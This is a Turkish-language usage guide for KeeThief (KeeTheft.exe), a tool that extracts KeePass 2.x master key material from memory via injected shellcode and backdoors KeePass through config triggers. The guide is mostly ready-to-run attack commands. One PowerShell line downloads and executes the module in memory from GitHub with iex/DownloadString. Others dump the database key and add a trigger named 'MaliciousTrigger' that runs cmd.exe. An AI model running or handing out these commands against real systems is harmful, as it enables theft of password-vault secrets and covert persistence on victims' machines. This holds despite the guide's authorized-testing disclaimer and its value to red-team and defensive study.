# KeeTheft.exe Kullanım Rehberi

## KeeThief Nedir?
**KeeThief**, KeePass 2.X şifre yöneticisiyle ilişkili anahtar materyalini bellekten çıkarmak, KeePass tetikleyici sistemini arka kapıdan erişmek ve yapılandırmalarını düzenlemek için kullanılan bir araçtır. Bu araç, hem güvenlik araştırmaları hem de sistem analizi için geliştirilmiştir.

### Öne Çıkan Özellikler
- **Anahtar Çıkartma:** KeePass anahtar materyalini bellekten çıkartır.
- **Bellek Deşifre Etme:** DPAPI şifrelenmiş verilerini çözmek için modifiye edilmiş shellcode kullanır.
- **Tetikleyici Manipülasyonu:** KeePass tetikleyicilerini ekleme, kaldırma veya listeleme.

---

## Kullanım Alanları
- KeePass veritabanlarının güvenlik analizi
- KeePass tetikleyici yapılandırmalarının incelenmesi ve düzenlenmesi
- Şifre yöneticisiyle ilgili güvenlik zafiyetlerini tespit etme

---

## Gerekli Bağımlılıklar
- .NET Framework (araç, birleştirilmiş CLR MD kütüphanesi ile birlikte gelir, harici bir bağımlılık gerektirmez).

---

## İndirme ve Kurulum
GitHub'dan aracı indirmek için:

```bash
git clone https://github.com/GhostPack/KeeThief.git
```

Derlemek için Visual Studio kullanabilirsiniz. Derlemeden sonra **KeeTheft.exe** adlı çalıştırılabilir dosya oluşturulacaktır.

---

## KeeTheft.exe Kullanımı

### Anahtar Çıkartma
KeePass anahtar materyalini çıkartmak için aşağıdaki komut kullanılabilir:

```bash
KeeTheft.exe
```

Komut çalıştırıldığında, KeePassLib.PwDatabase nesnesi aranır ve KeePass anahtar materyali (KcpPassword, KcpKeyFile, KcpUserAccount) bellekten çıkarılır. Şifrelenmiş anahtar materyali, belleğe shellcode enjekte edilerek deşifre edilir.

---

## PowerShell ile Kullanım
KeeThief'in PowerShell modülü ile KeePass materyali çıkarılabilir ve KeePass yapılandırma dosyaları düzenlenebilir.

### Modülü Belleğe Yükleme
```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GhostPack/KeeThief/master/PowerShell/KeeThief.ps1')
```

### Anahtar Çıkartma
```powershell
Get-KeePassDatabaseKey
```
Bu komut, KeePass.exe sürecine bağlanarak anahtar materyalini çıkarır.

### KeePass Tetikleyici Yönetimi
#### Tetikleyicileri Listeleme
```powershell
Get-KeePassConfigTrigger -Path 'C:\Users\Kullanici\AppData\Roaming\KeePass\KeePass.config.xml'
```

#### Yeni Bir Tetikleyici Eklemek
```powershell
Add-KeePassConfigTrigger -Path 'C:\Users\Kullanici\AppData\Roaming\KeePass\KeePass.config.xml' -Name "MaliciousTrigger" -Command "cmd.exe /c whoami"
```

#### Tetikleyiciyi Kaldırmak
```powershell
Remove-KeePassConfigTrigger -Path 'C:\Users\Kullanici\AppData\Roaming\KeePass\KeePass.config.xml' -Name "MaliciousTrigger"
```

---

## Yasal Uyarı
**KeeThief**, yalnızca yetkili ortamlarda araştırma ve güvenlik testleri için kullanılmalıdır. Bu aracın izinsiz kullanımı yasa dışıdır ve ciddi yasal sonuçlara yol açabilir. Aracın geliştiricileri, kötüye kullanımdan veya yetkisiz erişimden doğabilecek zararlardan sorumlu değildir.

---

## Teşekkürler
Bu projeye katkıda bulunanlar:
- **Lee Christensen (@tifkin_)**
- **Will Schroeder (@harmj0y)**

---

## Lisans
Bu proje, BSD 3-Clause Lisansı altında sunulmaktadır.

---

KeeThief hakkında daha fazla bilgi ve kullanım kılavuzları için [GitHub Sayfası](https://github.com/GhostPack/KeeThief) adresini ziyaret edebilirsiniz.
